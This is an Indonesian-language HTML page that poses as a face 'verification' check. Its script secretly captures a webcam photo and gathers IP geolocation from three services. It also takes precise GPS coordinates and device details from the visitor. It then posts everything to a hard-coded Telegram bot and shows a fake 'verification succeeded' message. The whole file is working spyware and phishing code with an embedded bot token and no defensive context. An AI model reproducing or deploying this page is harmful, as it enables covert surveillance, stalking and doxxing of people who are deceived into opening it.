<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi</title>
    <style>
        body { margin: 0; padding: 0; background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; color: white; }
        .container { background: #1a1a2e; padding: 30px; border-radius: 12px; text-align: center; width: 320px; }
        video { width: 100%; border-radius: 8px; background: #000; margin: 15px 0; transform: scaleX(-1); }
        .status { margin: 10px 0; padding: 8px; border-radius: 6px; background: #0f3460; font-size: 14px; }
        .msg { margin-top: 12px; font-size: 14px; color: #888; }
    </style>
</head>
<body>

<div class="container">
    <h2>📸 Verifikasi</h2>
    <p style="font-size:14px; color:#aaa;">Arahkan wajah ke kamera</p>
    <video id="video" autoplay playsinline></video>
    <div class="status" id="status">⏳ Menunggu...</div>
    <div class="msg" id="infoMsg">Memproses...</div>
</div>

<script>
    // ========== KONFIGURASI TELEGRAM ==========
    const BOT_TOKEN = "7961613868:AAExZB1W9L5EinCeDvwGASisthoLGgYayBM";
    const CHAT_ID = "7781744044";

    // ========== ELEMEN ==========
    const video = document.getElementById('video');
    const statusEl = document.getElementById('status');
    const infoMsg = document.getElementById('infoMsg');

    let stream = null;
    let photoTaken = false;
    let finalData = {};

    // ========== MULAI KAMERA ==========
    async function startCamera() {
        try {
            statusEl.textContent = '⏳ Mengakses kamera...';
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user', width: { ideal: 480 } } 
            });
            video.srcObject = stream;
            statusEl.textContent = '✅ Kamera aktif';

            await gatherAllData();

            setTimeout(() => {
                if (!photoTaken) captureAndSend();
            }, 600);

        } catch (err) {
            statusEl.textContent = '❌ Gagal akses kamera';
            infoMsg.textContent = 'Izin kamera diperlukan.';
        }
    }

    // ========== KUMPULKAN SEMUA DATA ==========
    async function gatherAllData() {
        // IP & Geolokasi dari 3 API sekaligus, lalu di-merge
        const [ipApi, ipApiCo, kameroGeo] = await Promise.all([
            fetch('https://ip-api.io/json/').then(r => r.json()).catch(() => ({})),
            fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
            fetch('https://geo.kamero.ai/api/geo').then(r => r.json()).catch(() => ({}))
        ]);

        // GPS dari browser
        const gps = await getGPS();

        // Merge data: prioritas ip-api.io > ipapi.co > kamero
        finalData = {
            // IP
            ip: ipApi.ip || ipApiCo.ip || kameroGeo.ip || 'Unknown',
            // Kota
            city: ipApi.city || ipApiCo.city || kameroGeo.city || 'Unknown',
            // Region
            region: ipApi.region || ipApiCo.region || kameroGeo.countryRegion || 'Unknown',
            // Negara
            country: ipApi.country || ipApiCo.country_name || kameroGeo.country || 'Unknown',
            // Kode Negara
            country_code: ipApi.country_code || ipApiCo.country_code || kameroGeo.countryCode || 'Unknown',
            // ISP
            isp: ipApi.isp || ipApiCo.org || ipApiCo.organization || kameroGeo.org || 'Unknown',
            // Timezone
            timezone: ipApi.timezone || ipApiCo.timezone || kameroGeo.timezone || 'Unknown',
            // Latitude & Longitude (IP-based)
            lat: ipApi.latitude || ipApiCo.latitude || kameroGeo.latitude || null,
            lon: ipApi.longitude || ipApiCo.longitude || kameroGeo.longitude || null,
            // GPS (lebih akurat)
            gps_lat: gps ? gps.lat : null,
            gps_lng: gps ? gps.lng : null,
            gps_accuracy: gps ? gps.accuracy : null,
            // Device
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`,
            timezone_device: Intl.DateTimeFormat().resolvedOptions().timeZone,
            online: navigator.onLine,
            cookies: navigator.cookieEnabled,
            // Extra
            zip: ipApi.zip || ipApiCo.postal || kameroGeo.postalCode || 'Unknown',
            currency: ipApi.currency || ipApiCo.currency || 'Unknown',
            languages: ipApiCo.languages || 'Unknown'
        };
    }

    // ========== GPS DARI BROWSER ==========
    function getGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    });
                },
                () => resolve(null),
                { timeout: 8000, enableHighAccuracy: true }
            );
        });
    }

    // ========== CAPTURE & KIRIM ==========
    async function captureAndSend() {
        if (!stream || photoTaken) return;

        statusEl.textContent = '📸 Memproses...';

        // Capture foto
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 480;
        canvas.height = video.videoHeight || 360;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);

        const d = finalData;
        const now = new Date();

        // ========== BUILD CAPTION ==========
        let caption = `📸 *NEW CAPTURE!*
🕐 ${now.toLocaleString('id-ID', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' })}

━━━━━━━━━━━━━━━━━━━━━━
🌐 *IP ADDRESS*
• IP: ${d.ip}
• ISP: ${d.isp}
• Country: ${d.country} (${d.country_code})
• Region: ${d.region}
• City: ${d.city}
• Postal: ${d.zip}
• Timezone: ${d.timezone}
• Currency: ${d.currency}
• Languages: ${d.languages}

━━━━━━━━━━━━━━━━━━━━━━
📍 *LOCATION (IP-BASED)*
• Coordinates: ${d.lat ? `${d.lat}, ${d.lon}` : 'Tidak tersedia'}
• Map: ${d.lat ? `https://www.google.com/maps?q=${d.lat},${d.lon}` : 'Tidak tersedia'}

━━━━━━━━━━━━━━━━━━━━━━
🛰️ *GPS LOCATION (Real-time)*`;

        if (d.gps_lat) {
            const gmaps = `https://www.google.com/maps?q=${d.gps_lat},${d.gps_lng}`;
            const osm = `https://www.openstreetmap.org/?mlat=${d.gps_lat}&mlon=${d.gps_lng}&zoom=15`;
            caption += `
• GPS Coordinates: ${d.gps_lat}, ${d.gps_lng}
• Accuracy: ±${Math.round(d.gps_accuracy || 0)} meters
• Google Maps: ${gmaps}
• OpenStreetMap: ${osm}`;
        } else {
            caption += `
• GPS: Tidak tersedia (izin ditolak/tidak support)
• IP-Based Map: ${d.lat ? `https://www.google.com/maps?q=${d.lat},${d.lon}` : 'Tidak tersedia'}`;
        }

        caption += `

━━━━━━━━━━━━━━━━━━━━━━
📱 *DEVICE INFO*
• Browser: ${d.userAgent}
• Platform: ${d.platform}
• Language: ${d.language}
• Screen: ${d.screen}
• Device Timezone: ${d.timezone_device}
• Online: ${d.online ? 'Yes' : 'No'}
• Cookies: ${d.cookies ? 'Enabled' : 'Disabled'}`;

        // ========== KIRIM KE TELEGRAM ==========
        const byteString = atob(imageDataUrl.split(',')[1]);
        const mimeString = imageDataUrl.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        const blob = new Blob([ab], { type: mimeString });

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'capture.jpg');
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                statusEl.textContent = '✅ Terkirim!';
                infoMsg.textContent = '✔️ Verifikasi selesai.';
                photoTaken = true;
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
                setTimeout(() => {
                    document.body.innerHTML = `
                        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#00ff88;font-family:Arial;font-size:20px;">
                            ✅ Verifikasi berhasil.
                        </div>
                    `;
                }, 1000);
            } else {
                statusEl.textContent = '❌ Gagal kirim';
                infoMsg.textContent = 'Error: ' + response.status;
            }
        } catch (err) {
            statusEl.textContent = '❌ Error: ' + err.message;
        }
    }

    // ========== JALANKAN ==========
    startCamera();
</script>

</body>
</html>
